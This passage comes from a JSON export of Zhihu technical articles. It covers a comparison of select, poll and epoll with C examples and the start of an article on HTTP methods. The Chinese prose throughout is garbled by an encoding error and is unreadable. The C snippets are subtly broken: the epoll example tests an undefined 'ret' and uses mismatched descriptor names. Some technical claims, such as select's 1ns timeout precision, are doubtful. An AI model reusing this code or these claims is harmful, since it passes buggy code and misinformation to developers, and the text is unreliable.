class=\"p\">;</span>\n\n<span class=\"c1\">// Wait 10 seconds\n</span><span class=\"c1\"></span><span class=\"kt\">int</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"n\">poll</span><span class=\"p\">(</span> <span class=\"o\">&amp;</span><span class=\"n\">fds</span><span class=\"p\">,</span> <span class=\"mi\">2</span><span class=\"p\">,</span> <span class=\"mi\">10000</span> <span class=\"p\">);</span>\n<span class=\"c1\">// Check if poll actually succeed\n</span><span class=\"c1\"></span><span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">ret</span> <span class=\"o\">==</span> <span class=\"o\">-</span><span class=\"mi\">1</span> <span class=\"p\">)</span>\n    <span class=\"c1\">// report error and abort\n</span><span class=\"c1\"></span><span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">ret</span> <span class=\"o\">==</span> <span class=\"mi\">0</span> <span class=\"p\">)</span>\n    <span class=\"c1\">// timeout; no event detected\n</span><span class=\"c1\"></span><span class=\"k\">else</span>\n<span class=\"p\">{</span>\n    <span class=\"c1\">// If we detect the event, zero it out so we can reuse the structure\n</span><span class=\"c1\"></span>    <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">fds</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"n\">revents</span> <span class=\"o\">&amp;</span> <span class=\"n\">POLLIN</span> <span class=\"p\">)</span>\n        <span class=\"n\">fds</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"n\">revents</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n        <span class=\"c1\">// input event on sock1\n</span><span class=\"c1\"></span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">fds</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"n\">revents</span> <span class=\"o\">&amp;</span> <span class=\"n\">POLLOUT</span> <span class=\"p\">)</span>\n        <span class=\"n\">fds</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">].</span><span class=\"n\">revents</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n        <span class=\"c1\">// output event on sock2\n</span><span class=\"c1\"></span><span class=\"p\">}</span></code></pre></div><h2>æ¯”è¾ƒ</h2><h3>1. åŠŸèƒ½</h3><p>select å’Œ poll çš„åŠŸèƒ½åŸºæœ¬ç›¸åŒï¼Œä¸è¿‡åœ¨ä¸€äº›å®ç°ç»†èŠ‚ä¸Šæœ‰æ‰€ä¸åŒã€‚</p><ul><li>select ä¼šä¿®æ”¹æè¿°ç¬¦ï¼Œè€Œ poll ä¸ä¼šï¼›</li><li>select çš„æè¿°ç¬¦ç±»å‹ä½¿ç”¨æ•°ç»„å®ç°ï¼ŒFD_SETSIZE å¤§å°é»˜è®¤ä¸º 1024ï¼Œå› æ­¤é»˜è®¤åªèƒ½ç›‘å¬ 1024 ä¸ªæè¿°ç¬¦ã€‚å¦‚æœè¦ç›‘å¬æ›´å¤šæè¿°ç¬¦çš„è¯ï¼Œéœ€è¦ä¿®æ”¹ FD_SETSIZE ä¹‹åé‡æ–°ç¼–è¯‘ï¼›è€Œ poll çš„æè¿°ç¬¦ç±»å‹ä½¿ç”¨é“¾è¡¨å®ç°ï¼Œæ²¡æœ‰æè¿°ç¬¦æ•°é‡çš„é™åˆ¶ï¼›</li><li>poll æä¾›äº†æ›´å¤šçš„äº‹ä»¶ç±»å‹ï¼Œå¹¶ä¸”å¯¹æè¿°ç¬¦çš„é‡å¤åˆ©ç”¨ä¸Šæ¯” select é«˜ã€‚</li><li>å¦‚æœä¸€ä¸ªçº¿ç¨‹å¯¹æŸä¸ªæè¿°ç¬¦è°ƒç”¨äº† select æˆ–è€… pollï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å…³é—­äº†è¯¥æè¿°ç¬¦ï¼Œä¼šå¯¼è‡´è°ƒç”¨ç»“æœä¸ç¡®å®šã€‚</li></ul><h3>2. é€Ÿåº¦</h3><p>select å’Œ poll é€Ÿåº¦éƒ½æ¯”è¾ƒæ…¢ã€‚</p><ul><li>select å’Œ poll æ¯æ¬¡è°ƒç”¨éƒ½éœ€è¦å°†å…¨éƒ¨æè¿°ç¬¦ä»åº”ç”¨è¿›ç¨‹ç¼“å†²åŒºå¤åˆ¶åˆ°å†…æ ¸ç¼“å†²åŒºã€‚</li><li>select å’Œ poll çš„è¿”å›ç»“æœä¸­æ²¡æœ‰å£°æ˜å“ªäº›æè¿°ç¬¦å·²ç»å‡†å¤‡å¥½ï¼Œæ‰€ä»¥å¦‚æœè¿”å›å€¼å¤§äº 0 æ—¶ï¼Œåº”ç”¨è¿›ç¨‹éƒ½éœ€è¦ä½¿ç”¨è½®è¯¢çš„æ–¹å¼æ¥æ‰¾åˆ° I/O å®Œæˆçš„æè¿°ç¬¦ã€‚</li></ul><h3>3. å¯ç§»æ¤æ€§</h3><p>å‡ ä¹æ‰€æœ‰çš„ç³»ç»Ÿéƒ½æ”¯æŒ selectï¼Œä½†æ˜¯åªæœ‰æ¯”è¾ƒæ–°çš„ç³»ç»Ÿæ”¯æŒ pollã€‚</p><h2>epoll</h2><div class=\"highlight\"><pre><code class=\"language-c\"><span class=\"kt\">int</span> <span class=\"nf\">epoll_create</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">size</span><span class=\"p\">);</span>\n<span class=\"kt\">int</span> <span class=\"nf\">epoll_ctl</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">epfd</span><span class=\"p\">,</span> <span class=\"kt\">int</span> <span class=\"n\">op</span><span class=\"p\">,</span> <span class=\"kt\">int</span> <span class=\"n\">fd</span><span class=\"p\">,</span> <span class=\"k\">struct</span> <span class=\"n\">epoll_event</span> <span class=\"o\">*</span><span class=\"n\">event</span><span class=\"p\">)</span><span class=\"err\">ï¼›</span>\n<span class=\"kt\">int</span> <span class=\"n\">epoll_wait</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">epfd</span><span class=\"p\">,</span> <span class=\"k\">struct</span> <span class=\"n\">epoll_event</span> <span class=\"o\">*</span> <span class=\"n\">events</span><span class=\"p\">,</span> <span class=\"kt\">int</span> <span class=\"n\">maxevents</span><span class=\"p\">,</span> <span class=\"kt\">int</span> <span class=\"n\">timeout</span><span class=\"p\">);</span></code></pre></div><p>epoll_ctl() ç”¨äºå‘å†…æ ¸æ³¨å†Œæ–°çš„æè¿°ç¬¦æˆ–è€…æ˜¯æ”¹å˜æŸä¸ªæ–‡ä»¶æè¿°ç¬¦çš„çŠ¶æ€ã€‚å·²æ³¨å†Œçš„æè¿°ç¬¦åœ¨å†…æ ¸ä¸­ä¼šè¢«ç»´æŠ¤åœ¨ä¸€æ£µçº¢é»‘æ ‘ä¸Šï¼Œé€šè¿‡å›è°ƒå‡½æ•°å†…æ ¸ä¼šå°† I/O å‡†å¤‡å¥½çš„æè¿°ç¬¦åŠ å…¥åˆ°ä¸€ä¸ªé“¾è¡¨ä¸­ç®¡ç†ï¼Œè¿›ç¨‹è°ƒç”¨ epoll_wait() ä¾¿å¯ä»¥å¾—åˆ°äº‹ä»¶å®Œæˆçš„æè¿°ç¬¦ã€‚</p><p>ä»ä¸Šé¢çš„æè¿°å¯ä»¥çœ‹å‡ºï¼Œepoll åªéœ€è¦å°†æè¿°ç¬¦ä»è¿›ç¨‹ç¼“å†²åŒºå‘å†…æ ¸ç¼“å†²åŒºæ‹·è´ä¸€æ¬¡ï¼Œå¹¶ä¸”è¿›ç¨‹ä¸éœ€è¦é€šè¿‡è½®è¯¢æ¥è·å¾—äº‹ä»¶å®Œæˆçš„æè¿°ç¬¦ã€‚</p><p>epoll ä»…é€‚ç”¨äº Linux OSã€‚</p><p>epoll æ¯” select å’Œ poll æ›´åŠ çµæ´»è€Œä¸”æ²¡æœ‰æè¿°ç¬¦æ•°é‡é™åˆ¶ã€‚</p><p>epoll å¯¹å¤šçº¿ç¨‹ç¼–ç¨‹æ›´æœ‰å‹å¥½ï¼Œä¸€ä¸ªçº¿ç¨‹è°ƒç”¨äº† epoll_wait() å¦ä¸€ä¸ªçº¿ç¨‹å…³é—­äº†åŒä¸€ä¸ªæè¿°ç¬¦ä¹Ÿä¸ä¼šäº§ç”Ÿåƒ select å’Œ poll çš„ä¸ç¡®å®šæƒ…å†µã€‚</p><div class=\"highlight\"><pre><code class=\"language-c\"><span class=\"c1\">// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets.\n</span><span class=\"c1\">// The function argument is ignored (it was not before, but now it is), so put your favorite number here\n</span><span class=\"c1\"></span><span class=\"kt\">int</span> <span class=\"n\">pollingfd</span> <span class=\"o\">=</span> <span class=\"n\">epoll_create</span><span class=\"p\">(</span> <span class=\"mh\">0xCAFE</span> <span class=\"p\">);</span>\n\n<span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">pollingfd</span> <span class=\"o\">&lt;</span> <span class=\"mi\">0</span> <span class=\"p\">)</span>\n <span class=\"c1\">// report error\n</span><span class=\"c1\"></span>\n<span class=\"c1\">// Initialize the epoll structure in case more members are added in future\n</span><span class=\"c1\"></span><span class=\"k\">struct</span> <span class=\"n\">epoll_event</span> <span class=\"n\">ev</span> <span class=\"o\">=</span> <span class=\"p\">{</span> <span class=\"mi\">0</span> <span class=\"p\">};</span>\n\n<span class=\"c1\">// Associate the connection class instance with the event. You can associate anything\n</span><span class=\"c1\">// you want, epoll does not use this information. We store a connection class pointer, pConnection1\n</span><span class=\"c1\"></span><span class=\"n\">ev</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">ptr</span> <span class=\"o\">=</span> <span class=\"n\">pConnection1</span><span class=\"p\">;</span>\n\n<span class=\"c1\">// Monitor for input, and do not automatically rearm the descriptor after the event\n</span><span class=\"c1\"></span><span class=\"n\">ev</span><span class=\"p\">.</span><span class=\"n\">events</span> <span class=\"o\">=</span> <span class=\"n\">EPOLLIN</span> <span class=\"o\">|</span> <span class=\"n\">EPOLLONESHOT</span><span class=\"p\">;</span>\n<span class=\"c1\">// Add the descriptor into the monitoring list. We can do it even if another thread is\n</span><span class=\"c1\">// waiting in epoll_wait - the descriptor will be properly added\n</span><span class=\"c1\"></span><span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">epoll_ctl</span><span class=\"p\">(</span> <span class=\"n\">epollfd</span><span class=\"p\">,</span> <span class=\"n\">EPOLL_CTL_ADD</span><span class=\"p\">,</span> <span class=\"n\">pConnection1</span><span class=\"o\">-&gt;</span><span class=\"n\">getSocket</span><span class=\"p\">(),</span> <span class=\"o\">&amp;</span><span class=\"n\">ev</span> <span class=\"p\">)</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span> <span class=\"p\">)</span>\n    <span class=\"c1\">// report error\n</span><span class=\"c1\"></span>\n<span class=\"c1\">// Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen)\n</span><span class=\"c1\"></span><span class=\"k\">struct</span> <span class=\"n\">epoll_event</span> <span class=\"n\">pevents</span><span class=\"p\">[</span> <span class=\"mi\">20</span> <span class=\"p\">];</span>\n\n<span class=\"c1\">// Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event array\n</span><span class=\"c1\"></span><span class=\"kt\">int</span> <span class=\"n\">ready</span> <span class=\"o\">=</span> <span class=\"n\">epoll_wait</span><span class=\"p\">(</span> <span class=\"n\">pollingfd</span><span class=\"p\">,</span> <span class=\"n\">pevents</span><span class=\"p\">,</span> <span class=\"mi\">20</span><span class=\"p\">,</span> <span class=\"mi\">10000</span> <span class=\"p\">);</span>\n<span class=\"c1\">// Check if epoll actually succeed\n</span><span class=\"c1\"></span><span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">ret</span> <span class=\"o\">==</span> <span class=\"o\">-</span><span class=\"mi\">1</span> <span class=\"p\">)</span>\n    <span class=\"c1\">// report error and abort\n</span><span class=\"c1\"></span><span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">ret</span> <span class=\"o\">==</span> <span class=\"mi\">0</span> <span class=\"p\">)</span>\n    <span class=\"c1\">// timeout; no event detected\n</span><span class=\"c1\"></span><span class=\"k\">else</span>\n<span class=\"p\">{</span>\n    <span class=\"c1\">// Check if any events detected\n</span><span class=\"c1\"></span>    <span class=\"k\">for</span> <span class=\"p\">(</span> <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">ret</span><span class=\"p\">;</span> <span class=\"n\">i</span><span class=\"o\">++</span> <span class=\"p\">)</span>\n    <span class=\"p\">{</span>\n        <span class=\"k\">if</span> <span class=\"p\">(</span> <span class=\"n\">pevents</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">events</span> <span class=\"o\">&amp;</span> <span class=\"n\">EPOLLIN</span> <span class=\"p\">)</span>\n        <span class=\"p\">{</span>\n            <span class=\"c1\">// Get back our connection pointer\n</span><span class=\"c1\"></span>            <span class=\"n\">Connection</span> <span class=\"o\">*</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"n\">Connection</span><span class=\"o\">*</span><span class=\"p\">)</span> <span class=\"n\">pevents</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">ptr</span><span class=\"p\">;</span>\n            <span class=\"n\">c</span><span class=\"o\">-&gt;</span><span class=\"n\">handleReadEvent</span><span class=\"p\">();</span>\n         <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">}</span></code></pre></div><h2>å·¥ä½œæ¨¡å¼</h2><p>epoll çš„æè¿°ç¬¦äº‹ä»¶æœ‰ä¸¤ç§è§¦å‘æ¨¡å¼ï¼šLTï¼ˆlevel triggerï¼‰å’Œ ETï¼ˆedge triggerï¼‰ã€‚</p><h3>1. LT æ¨¡å¼</h3><p>å½“ epoll_wait() æ£€æµ‹åˆ°æè¿°ç¬¦äº‹ä»¶åˆ°è¾¾æ—¶ï¼Œå°†æ­¤äº‹ä»¶é€šçŸ¥è¿›ç¨‹ï¼Œè¿›ç¨‹å¯ä»¥ä¸ç«‹å³å¤„ç†è¯¥äº‹ä»¶ï¼Œä¸‹æ¬¡è°ƒç”¨ epoll_wait() ä¼šå†æ¬¡é€šçŸ¥è¿›ç¨‹ã€‚æ˜¯é»˜è®¤çš„ä¸€ç§æ¨¡å¼ï¼Œå¹¶ä¸”åŒæ—¶æ”¯æŒ Blocking å’Œ No-Blockingã€‚</p><h3>2. ET æ¨¡å¼</h3><p>å’Œ LT æ¨¡å¼ä¸åŒçš„æ˜¯ï¼Œé€šçŸ¥ä¹‹åè¿›ç¨‹å¿…é¡»ç«‹å³å¤„ç†äº‹ä»¶ï¼Œä¸‹æ¬¡å†è°ƒç”¨ epoll_wait() æ—¶ä¸ä¼šå†å¾—åˆ°äº‹ä»¶åˆ°è¾¾çš„é€šçŸ¥ã€‚</p><p>å¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘äº† epoll äº‹ä»¶è¢«é‡å¤è§¦å‘çš„æ¬¡æ•°ï¼Œå› æ­¤æ•ˆç‡è¦æ¯” LT æ¨¡å¼é«˜ã€‚åªæ”¯æŒ No-Blockingï¼Œä»¥é¿å…ç”±äºä¸€ä¸ªæ–‡ä»¶å¥æŸ„çš„é˜»å¡è¯»/é˜»å¡å†™æ“ä½œæŠŠå¤„ç†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦çš„ä»»åŠ¡é¥¿æ­»ã€‚</p><h2>åº”ç”¨åœºæ™¯</h2><p>å¾ˆå®¹æ˜“äº§ç”Ÿä¸€ç§é”™è§‰è®¤ä¸ºåªè¦ç”¨ epoll å°±å¯ä»¥äº†ï¼Œselect å’Œ poll éƒ½å·²ç»è¿‡æ—¶äº†ï¼Œå…¶å®å®ƒä»¬éƒ½æœ‰å„è‡ªçš„ä½¿ç”¨åœºæ™¯ã€‚</p><h3>1. select åº”ç”¨åœºæ™¯</h3><p>select çš„ timeout å‚æ•°ç²¾åº¦ä¸º 1nsï¼Œè€Œ poll å’Œ epoll ä¸º 1msï¼Œå› æ­¤ select æ›´åŠ é€‚ç”¨äºå®æ—¶æ€§è¦æ±‚æ¯”è¾ƒé«˜çš„åœºæ™¯ï¼Œæ¯”å¦‚æ ¸ååº”å †çš„æ§åˆ¶ã€‚</p><p>select å¯ç§»æ¤æ€§æ›´å¥½ï¼Œå‡ ä¹è¢«æ‰€æœ‰ä¸»æµå¹³å°æ‰€æ”¯æŒã€‚</p><h3>2. poll åº”ç”¨åœºæ™¯</h3><p>poll æ²¡æœ‰æœ€å¤§æè¿°ç¬¦æ•°é‡çš„é™åˆ¶ï¼Œå¦‚æœå¹³å°æ”¯æŒå¹¶ä¸”å¯¹å®æ—¶æ€§è¦æ±‚ä¸é«˜ï¼Œåº”è¯¥ä½¿ç”¨ poll è€Œä¸æ˜¯ selectã€‚</p><h3>3. epoll åº”ç”¨åœºæ™¯</h3><p>åªéœ€è¦è¿è¡Œåœ¨ Linux å¹³å°ä¸Šï¼Œæœ‰å¤§é‡çš„æè¿°ç¬¦éœ€è¦åŒæ—¶è½®è¯¢ï¼Œå¹¶ä¸”è¿™äº›è¿æ¥æœ€å¥½æ˜¯é•¿è¿æ¥ã€‚</p><p>éœ€è¦åŒæ—¶ç›‘æ§å°äº 1000 ä¸ªæè¿°ç¬¦ï¼Œå°±æ²¡æœ‰å¿…è¦ä½¿ç”¨ epollï¼Œå› ä¸ºè¿™ä¸ªåº”ç”¨åœºæ™¯ä¸‹å¹¶ä¸èƒ½ä½“ç° epoll çš„ä¼˜åŠ¿ã€‚</p><p>éœ€è¦ç›‘æ§çš„æè¿°ç¬¦çŠ¶æ€å˜åŒ–å¤šï¼Œè€Œä¸”éƒ½æ˜¯éå¸¸çŸ­æš‚çš„ï¼Œä¹Ÿæ²¡æœ‰å¿…è¦ä½¿ç”¨ epollã€‚å› ä¸º epoll ä¸­çš„æ‰€æœ‰æè¿°ç¬¦éƒ½å­˜å‚¨åœ¨å†…æ ¸ä¸­ï¼Œé€ æˆæ¯æ¬¡éœ€è¦å¯¹æè¿°ç¬¦çš„çŠ¶æ€æ”¹å˜éƒ½éœ€è¦é€šè¿‡ epoll_ctl() è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œé¢‘ç¹ç³»ç»Ÿè°ƒç”¨é™ä½æ•ˆç‡ã€‚å¹¶ä¸” epoll çš„æè¿°ç¬¦å­˜å‚¨åœ¨å†…æ ¸ï¼Œä¸å®¹æ˜“è°ƒè¯•ã€‚</p><h2>å‚è€ƒèµ„æ–™</h2><ul><li>Stevens W R, Fenner B, Rudoff A M. UNIX network programming[M]. Addison-Wesley Professional, 2004.</li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.ibm.com/developerworks/linux/library/l-async/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Boost application performance using asynchronous I/O</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//msdn.microsoft.com/en-us/library/windows/desktop/aa365683%28v%3Dvs.85%29.aspx\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Synchronous and Asynchronous I/O</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//segmentfault.com/a/1190000003063859\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Linux IO æ¨¡å¼åŠ selectã€pollã€epoll è¯¦è§£</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//daniel.haxx.se/docs/poll-vs-select.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">poll vs select vs event-based</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.ulduzsoft.com/2014/01/select-poll-epoll-practical-difference-for-system-architects/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">select / poll / epoll: practical difference for system architects</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Browse the source code of userspace/glibc/sysdeps/unix/sysv/linux/ online</a></li></ul><h2>å¾®ä¿¡å…¬ä¼—å·</h2><p>å¾®ä¿¡å…¬ä¼—å· CyC2018 æä¾›äº†è¯¥é¡¹ç›®çš„ç¦»çº¿é˜…è¯»ç‰ˆæœ¬ï¼Œåå°å›å¤ &#34;ä¸‹è½½&#34; å³å¯é¢†å–ã€‚ä¹Ÿæä¾›äº†ä¸€ä»½æŠ€æœ¯é¢è¯•å¤ä¹ å¤§çº²ï¼Œä¸ä»…ç³»ç»Ÿæ•´ç†äº†é¢è¯•çŸ¥è¯†ç‚¹ï¼Œè€Œä¸”æ ‡æ³¨äº†å„ä¸ªçŸ¥è¯†ç‚¹çš„é‡è¦ç¨‹åº¦ï¼Œä»è€Œå¸®ä½ ç†æ¸…å¤šè€Œæ‚çš„é¢è¯•çŸ¥è¯†ç‚¹ï¼Œåå°å›å¤ &#34;å¤§çº²&#34; å³å¯é¢†å–ã€‚æˆ‘åŸºæœ¬æ˜¯æŒ‰ç…§è¿™ä¸ªå¤§çº²æ¥è¿›è¡Œå¤ä¹ çš„ï¼Œå¯¹æˆ‘æ‹¿åˆ°äº† BAT å¤´æ¡ç­‰ Offer èµ·åˆ°å¾ˆå¤§çš„å¸®åŠ©ã€‚ä½ ä»¬å®Œå…¨å¯ä»¥å’Œæˆ‘ä¸€æ ·æ ¹æ®å¤§çº²ä¸Šåˆ—çš„çŸ¥è¯†ç‚¹æ¥è¿›è¡Œå¤ä¹ ï¼Œå°±ä¸ç”¨çœ‹å¾ˆå¤šä¸é‡è¦çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥çŸ¥é“å“ªäº›å†…å®¹å¾ˆé‡è¦ä»è€Œå¤šå®‰æ’ä¸€äº›å¤ä¹ æ—¶é—´ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "Socket", 
                    "tagLink": "https://api.zhihu.com/topics/19604051"
                }, 
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68764595", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 1, 
            "title": "HTTP", 
            "content": "<p></p><h2>ä¸€ ã€åŸºç¡€æ¦‚å¿µ</h2><h2>URI</h2><p>URI åŒ…å« URL å’Œ URNã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-376bd7732a90331b7ff7f7d943ce7c17_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"762\" data-rawheight=\"403\" class=\"origin_image zh-lightbox-thumb\" width=\"762\" data-original=\"https://pic4.zhimg.com/v2-376bd7732a90331b7ff7f7d943ce7c17_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;762&#39; height=&#39;403&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"762\" data-rawheight=\"403\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"762\" data-original=\"https://pic4.zhimg.com/v2-376bd7732a90331b7ff7f7d943ce7c17_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-376bd7732a90331b7ff7f7d943ce7c17_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è¯·æ±‚å’Œå“åº”æŠ¥æ–‡</h2><h3>1. è¯·æ±‚æŠ¥æ–‡</h3><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-cd86f8fbd1c2d3a0580e8917a607c343_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"656\" data-rawheight=\"221\" class=\"origin_image zh-lightbox-thumb\" width=\"656\" data-original=\"https://pic4.zhimg.com/v2-cd86f8fbd1c2d3a0580e8917a607c343_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;656&#39; height=&#39;221&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"656\" data-rawheight=\"221\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"656\" data-original=\"https://pic4.zhimg.com/v2-cd86f8fbd1c2d3a0580e8917a607c343_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-cd86f8fbd1c2d3a0580e8917a607c343_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. å“åº”æŠ¥æ–‡</h3><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-71c4b0d5df52bf4a27b525d9bd8c2c8f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"704\" data-rawheight=\"267\" class=\"origin_image zh-lightbox-thumb\" width=\"704\" data-original=\"https://pic4.zhimg.com/v2-71c4b0d5df52bf4a27b525d9bd8c2c8f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;704&#39; height=&#39;267&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"704\" data-rawheight=\"267\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"704\" data-original=\"https://pic4.zhimg.com/v2-71c4b0d5df52bf4a27b525d9bd8c2c8f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-71c4b0d5df52bf4a27b525d9bd8c2c8f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>äºŒã€HTTP æ–¹æ³•</h2><p>å®¢æˆ·ç«¯å‘é€çš„  <b>è¯·æ±‚æŠ¥æ–‡</b>  ç¬¬ä¸€è¡Œä¸ºè¯·æ±‚è¡Œï¼ŒåŒ…å«äº†æ–¹æ³•å­—æ®µã€‚</p><h2>GET</h2><blockquote> è·å–èµ„æº<br/> </blockquote><p>å½“å‰ç½‘ç»œè¯·æ±‚ä¸­ï¼Œç»å¤§éƒ¨åˆ†ä½¿ç”¨çš„æ˜¯ GET æ–¹æ³•ã€‚</p><h2>HEAD</h2><blockquote> è·å–æŠ¥æ–‡é¦–éƒ¨<br/> </blockquote><p>å’Œ GET æ–¹æ³•ç±»ä¼¼ï¼Œä½†æ˜¯ä¸è¿”å›æŠ¥æ–‡å®ä½“ä¸»ä½“éƒ¨åˆ†ã€‚</p><p>ä¸»è¦ç”¨äºç¡®è®¤ URL çš„æœ‰æ•ˆæ€§ä»¥åŠèµ„æºæ›´æ–°çš„æ—¥æœŸæ—¶é—´ç­‰ã€‚</p><h2>POST</h2><blockquote> ä¼ è¾“å®ä½“ä¸»ä½“<br/> </blockquote><p>POST ä¸»è¦ç”¨æ¥ä¼ è¾“æ•°æ®ï¼Œè€Œ GET ä¸»è¦ç”¨æ¥è·å–èµ„æºã€‚</p><p>æ›´å¤š POST ä¸ GET çš„æ¯”è¾ƒè¯·è§ç¬¬ä¹ç« ã€‚</p><h2>PUT</h2><blockquote> ä¸Šä¼ æ–‡ä»¶<br/> </blockquote><p>ç”±äºè‡ªèº«ä¸å¸¦éªŒè¯æœºåˆ¶ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå› æ­¤å­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œä¸€èˆ¬ä¸ä½¿ç”¨è¯¥æ–¹æ³•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">PUT /new.html HTTP/1.1\nHost: example.com\nContent-type: text/html\nContent-length: 16\n\n<span class=\"p\">&lt;</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>New File<span class=\"p\">&lt;/</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span></code></pre></div><h2>PATCH</h2><blockquote> å¯¹èµ„æºè¿›è¡Œéƒ¨åˆ†ä¿®æ”¹<br/> </blockquote><p>PUT ä¹Ÿå¯ä»¥ç”¨äºä¿®æ”¹èµ„æºï¼Œä½†æ˜¯åªèƒ½å®Œå…¨æ›¿ä»£åŸå§‹èµ„æºï¼ŒPATCH å…è®¸éƒ¨åˆ†ä¿®æ”¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">PATCH /file.txt 